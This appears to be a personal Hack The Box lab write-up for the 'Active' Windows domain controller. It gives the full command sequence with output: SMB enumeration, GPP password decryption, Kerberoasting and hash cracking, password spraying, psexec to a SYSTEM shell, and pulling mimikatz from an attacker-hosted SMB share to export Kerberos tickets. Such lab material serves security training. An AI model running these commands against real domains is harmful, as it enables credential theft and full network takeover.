# HTB Active

# recon

```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# nmap -Pn -sT -sV -n 10.10.10.100 -p- --min-rate 1000 --max-retries 2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-23 17:21 EST
Warning: 10.10.10.100 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.100
Host is up (0.099s latency).
Not shown: 51778 closed ports, 13739 filtered ports
PORT      STATE SERVICE       VERSION
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-23 22:38:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## SMB tcp/445

```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# smbmap -u '' -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
                                                                                                           
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# nmap -Pn -sT -sV -n --script smb-enum-shares  10.10.10.100 -p 135,139,445
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-23 17:30 EST
Nmap scan report for 10.10.10.100
Host is up (0.072s latency).

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# crackmapexec smb 10.10.10.100 -u '' --shares                  
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# smbclient -L 10.10.10.100 -U ""%""                                                                                                                                                   1 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```                                              
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# smbclient -L 10.10.10.100 -N                     
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# smbclient  //10.10.10.100/Replication -N
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
```console
──(root💀kali)-[/OSCPv3/htb/Active/active.htb]
└─# tree                                                                                                                                                                               127 ⨯
.
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts

21 directories, 7 files
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active/active.htb]
└─# find . -type f 2>/dev/null | xargs file | grep -v open
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml: XML 1.0 document, ASCII text, with very long lines, with CRLF line terminators
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol:                  data
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI:                               ASCII text, with CRLF line terminators
./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI:                               ASCII text, with CRLF line terminators
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# mount -t cifs //10.10.10.100/Replication /OSCPv3/htb/Active/Replication -o username=null,password=null,domain=active.htb,vers=2.0                                                 32 ⨯
mount error(13): Permission denied
Refer to the mount.cifs(8) manual page (e.g. man mount.cifs) and kernel log messages (dmesg)
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active/active.htb]
└─# smbmap -H 10.10.10.100 -R Replication -A Groups.xml -q
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
[+] Starting search for files matching 'Groups.xml' on share Replication.
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active/active.htb]
└─# cat ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active/active.htb]
└─# python3 /opt/gpp-decrypt/gpp-decrypt.py -f ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml                                                   2 ⨯

                               __                                __ 
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
/___/  /_/    /_/                                /___/  /_/         

[ * ] Username: active.htb\SVC_TGS
[ * ] Password: GPPstillStandingStrong2k18
                                                                                                                                                                                             
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active/active.htb]
└─# crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' 
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active/active.htb]
└─# crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ            
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active/active.htb]
└─# smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -R Users -A user.txt -q
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
[+] Starting search for files matching 'user.txt' on share Users.
[+] Match found! Downloading: Users\SVC_TGS\Desktop\user.txt
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# mount -t cifs //10.10.10.100/Replication /OSCPv3/htb/Active/Replication -o username=SVC_TGS,password=GPPstillStandingStrong2k18,domain=active.htb,vers=2.1                           1 ⨯
```                                 
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# df -k -F cifs
Filesystem                 1K-blocks     Used Available Use% Mounted on
//10.10.10.100/Replication  20868092 19749356   1118736  95% /OSCPv3/htb/Active/Replication
```

## Kerberos tcp tcp/88
### Enumerate users
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# impacket-GetADUsers -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 15:06:40.351723  2022-01-23 18:48:34.098566 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 14:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 16:14:38.402764  2018-07-21 10:01:30.320277 
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# kerbrute userenum --domain active.htb /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.100 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/23/22 - Ronnie Flathers @ropnop

2022/01/23 19:43:05 >  Using KDC(s):
2022/01/23 19:43:05 >   10.10.10.100:88

2022/01/23 19:43:20 >  [+] VALID USERNAME:       administrator@active.htb
2022/01/23 19:44:51 >  [+] VALID USERNAME:       Administrator@active.htb
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# rpcclient -U 'SVC_TGS%GPPstillStandingStrong2k18' 10.10.10.100                                                                                                                       1 ⨯
rpcclient $> querydominfo
Domain:         ACTIVE
Server:
Comment:
Total Users:    31
Total Groups:   0
Total Aliases:  11
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```
```console
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]
``` 
```console
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]
```
```console
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
```
```console
pcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Sun, 23 Jan 2022 18:48:34 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Wed, 18 Jul 2018 15:06:40 EDT
        Password can change Time :      Thu, 19 Jul 2018 15:06:40 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000040
        padding1[0..7]...
        logon_hrs[0..21]...
```
```console
rpcclient $> lsaenumsid
found 16 SIDs

S-1-5-9
S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
S-1-5-80-0
S-1-5-6
S-1-5-32-559
S-1-5-32-554
S-1-5-32-551
S-1-5-32-550
S-1-5-32-549
S-1-5-32-548
S-1-5-32-545
S-1-5-32-544
S-1-5-20
S-1-5-19
S-1-5-11
S-1-1-0
```
```console
rpcclient $> createdomuser hacker
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
#setuserinfo2 hacker 24 Password@1
#enumdomusers
#chgpasswd raj Password@1 Password@987
```
```console
rpcclient $> lsaquery
Domain Name: ACTIVE
Domain Sid: S-1-5-21-405608879-3187717380-1996298813
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# rdate -n 10.10.10.100                                         
Sun Jan 23 21:06:21 EST 2022
```
```console
### Attack - Spray

https://www.hackingarticles.in/kerberos-brute-force-attack/
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# crackmapexec smb 10.10.10.100 -u 'Administrator' -p pwds.txt  
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```
```console
┌──(root💀kali)-[/opt/kerbrute]
└─# python3 kerbrute.py -user Administrator -passwords /OSCPv3/htb/Active/pwds.txt -domain active -dc-ip 10.10.10.100
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Stupendous => Administrator:Ticketmaster1968
[*] Saved TGT in Administrator.ccache
```

### Attack - Kerberoasting

https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/

https://www.hackingarticles.in/abusing-kerberos-using-impacket/

```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-01-23 20:51:31.803924             
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-01-23 20:51:31.803924             


$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$da91e5bfe5038c2bbbd4b81d92722c94$c798284988165844dac64bffba4e8c4760877e46ec31dec878c40cbe41d787a4a8f341a50adfcee66a40bb9d9f7aea1196207282f191434427f274d88eb36ad702165709bc603a838682b07868207185698122dfb12dd6886b65543e56ab5ab5260a66bfeb5f0ca12285400069df6f078746cab95622bc5afa9b7868baa24e00d6d2489a17e7a5ce02661ce04dbec62851b9365c502298b52979d7522fccdb75ee8357396992e707123ef91db0b7e5910b202748f1f69fbfa622e220cb46b261beb7e43c050799a4d9be33081e00391cd4ec02f6a72568181657c43ea784a9162e28294ac964e82586abf85a8e2357b30d5c545e40dda60aca98ca26aae759606cba48ad7c98ca57aac002be341a02eda4f2a7bfeb9b63c8355837013c20ff2518cb79b810cc151d1cb9a59eb8eafcf34fcdca13d91e063c7588cb57af019b56086d9fb30d6ff52a5d96e1d91f181f218fd0d7b77c69baa863bce8ad301afcb9dc9dc56821b4815d0d57d276e1419407e41cebd49b46237bace69c4160d289eedfd5157e70d9b48f7558e04a8fa504fd00849cdc928fc62e9223327a82b565151fca2fb680beb267b3c8cf1738fffcad719664e68352952b31cdef22bf20e01a150835870b84f999a18c6798e901770555aa05f7d7a3414adba8e7c9341594337535332c37fa9d220815f36da19f78d10050482d528764caadef97460669505b4049e85e029d9bb861074b3e6508e5357fad8873c934ac2f89ed0293d052c10a43242692733a310a5ceb42e9056b31e2b3eae4b5ccf0829662a548cdcb60187cbd9de8e10aff57dc45db985f66a10443c4f974b83db9464e500f85d4b5623bb55aa1d402f9b85bb72251deb66bc1303be26afa059819fc9a21c94301d15ca8170eabce14e204857dcfb3f87a7c618270193d240fe1b95c0ad89d792c9cce6d4e17860766392dcbe1057dcb2f7fb48fa07d65f378738cf60dc50a9178539ecd59134a506d65061d17f6f151fc5336dc87c104cef3078d841e9a71397129a5d55730a7c6c113a46bbac8e69e75bc24084a7429c70e4f17b1dade088af86d20e7a129751cb41bb62b0bcb9be928d32cef70674c81938f4ec28ec2bd3386561c1590809951129c76a7bc1945d7362e726b969f42dcb62aa534d315db2ae333e934fb7c6f14901893da8bf7dd67b168ca9a4d2542115c46529f1f37302f88c83c64970d58b782318e0566e9dbdf19aae50ba81b3c384d3e6947d6272d
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# john hash_tgt.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:13 DONE (2022-01-23 21:09) 0.07374g/s 777137p/s 777137c/s 777137C/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# hashcat -m 13100 -a 0 hash_tgt.txt /usr/share/wordlists/rockyou.txt --show --force
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$da91e5bfe5038c2bbbd4b81d92722c94$c798284988165844dac64bffba4e8c4760877e46ec31dec878c40cbe41d787a4a8f341a50adfcee66a40bb9d9f7aea1196207282f191434427f274d88eb36ad702165709bc603a838682b07868207185698122dfb12dd6886b65543e56ab5ab5260a66bfeb5f0ca12285400069df6f078746cab95622bc5afa9b7868baa24e00d6d2489a17e7a5ce02661ce04dbec62851b9365c502298b52979d7522fccdb75ee8357396992e707123ef91db0b7e5910b202748f1f69fbfa622e220cb46b261beb7e43c050799a4d9be33081e00391cd4ec02f6a72568181657c43ea784a9162e28294ac964e82586abf85a8e2357b30d5c545e40dda60aca98ca26aae759606cba48ad7c98ca57aac002be341a02eda4f2a7bfeb9b63c8355837013c20ff2518cb79b810cc151d1cb9a59eb8eafcf34fcdca13d91e063c7588cb57af019b56086d9fb30d6ff52a5d96e1d91f181f218fd0d7b77c69baa863bce8ad301afcb9dc9dc56821b4815d0d57d276e1419407e41cebd49b46237bace69c4160d289eedfd5157e70d9b48f7558e04a8fa504fd00849cdc928fc62e9223327a82b565151fca2fb680beb267b3c8cf1738fffcad719664e68352952b31cdef22bf20e01a150835870b84f999a18c6798e901770555aa05f7d7a3414adba8e7c9341594337535332c37fa9d220815f36da19f78d10050482d528764caadef97460669505b4049e85e029d9bb861074b3e6508e5357fad8873c934ac2f89ed0293d052c10a43242692733a310a5ceb42e9056b31e2b3eae4b5ccf0829662a548cdcb60187cbd9de8e10aff57dc45db985f66a10443c4f974b83db9464e500f85d4b5623bb55aa1d402f9b85bb72251deb66bc1303be26afa059819fc9a21c94301d15ca8170eabce14e204857dcfb3f87a7c618270193d240fe1b95c0ad89d792c9cce6d4e17860766392dcbe1057dcb2f7fb48fa07d65f378738cf60dc50a9178539ecd59134a506d65061d17f6f151fc5336dc87c104cef3078d841e9a71397129a5d55730a7c6c113a46bbac8e69e75bc24084a7429c70e4f17b1dade088af86d20e7a129751cb41bb62b0bcb9be928d32cef70674c81938f4ec28ec2bd3386561c1590809951129c76a7bc1945d7362e726b969f42dcb62aa534d315db2ae333e934fb7c6f14901893da8bf7dd67b168ca9a4d2542115c46529f1f37302f88c83c64970d58b782318e0566e9dbdf19aae50ba81b3c384d3e6947d6272d:Ticketmaster1968
```

### Attack - ASPREPRoast 
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# impacket-GetNPUsers active.htb/ -usersfile users.txt -format john -outputfile hash_tgt_ASPREPRoast.txt -dc-ip 10.10.10.100  
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                                                                                                 
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# impacket-GetNPUsers 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -format john -outputfile hash_tgt_ASPREPRoast.txt -dc-ip 10.10.10.100 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

No entries found!
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# impacket-GetNPUsers 'active.htb/Administrator:Ticketmaster1968' -format john -outputfile hash_tgt_ASPREPRoast.txt -dc-ip 10.10.10.100  
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

No entries found!
```


### Attack - kerberoasting Local
#### Mimikatz
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'                                                                                                               1 ⨯
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file ATUtFThc.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service rbzA on 10.10.10.100.....
[*] Starting service rbzA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```
```console
─# impacket-smbserver folder .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.100,49796)
[*] AUTHENTICATE_MESSAGE (ACTIVE\DC$,DC)
[*] User DC\DC$ authenticated successfully
[*] DC$::ACTIVE:aaaaaaaaaaaaaaaa:3952a94586911f8542df9adc1b40103d:0101000000000000005e6777ce10d801e7954c65893de33b00000000010010007600560077005300490042006d004b00030010007600560077005300490042006d004b000200100072006d004500510058004f004f0051000400100072006d004500510058004f004f00510007000800005e6777ce10d8010600040002000000080030003000000000000000000000000040000089e37691e6b5926d876f8d58b2c6230e8209b9f90d393378dab117354fdc94d50a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003200000000000000000000000000


C:\Windows\system32>copy \\10.10.14.12\folder\mimikatz.exe C:\Windows\Temp\mimikatz.exe
        1 file(s) copied.



 
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::list

[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 1:48:35 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : krbtgt/ACTIVE.HTB @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 60a00000    : pre_authent ; renewable ; forwarded ; forwardable ; 

[00000001] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 1:47:50 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : krbtgt/ACTIVE.HTB @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ; 

[00000002] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 2:02:20 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : GC/DC.active.htb/active.htb @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000003] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 1:48:35 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : DC$ @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000004] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 1:48:35 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : cifs/DC.active.htb @ ACTIVE.HTB                                                                                                                                       
   Client Name       : dc$ @ ACTIVE.HTB                                                                                                                                                      
   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ;                                                                                                              
                                                                                                                                                                                             
[00000005] - 0x00000012 - aes256_hmac                                                                                                                                                        
   Start/End/MaxRenew: 24/1/2022 1:47:58 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝                                                                                             
   Server Name       : ldap/DC.active.htb/active.htb @ ACTIVE.HTB                                                                                                                            
   Client Name       : dc$ @ ACTIVE.HTB                                                                                                                                                      
   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ;                                                                                                              
                                                                                                                                                                                             
[00000006] - 0x00000012 - aes256_hmac                                                                                                                                                        
   Start/End/MaxRenew: 24/1/2022 1:47:50 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : LDAP/DC @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000007] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 1:47:50 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : ldap/DC.active.htb @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 



mimikatz # kerberos::list /export
 
[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 24/1/2022 1:48:35 ╧Ç╬╝ ; 24/1/2022 11:47:50 ╧Ç╬╝ ; 31/1/2022 1:47:50 ╧Ç╬╝
   Server Name       : krbtgt/ACTIVE.HTB @ ACTIVE.HTB
   Client Name       : dc$ @ ACTIVE.HTB
   Flags 60a00000    : pre_authent ; renewable ; forwarded ; forwardable ; 
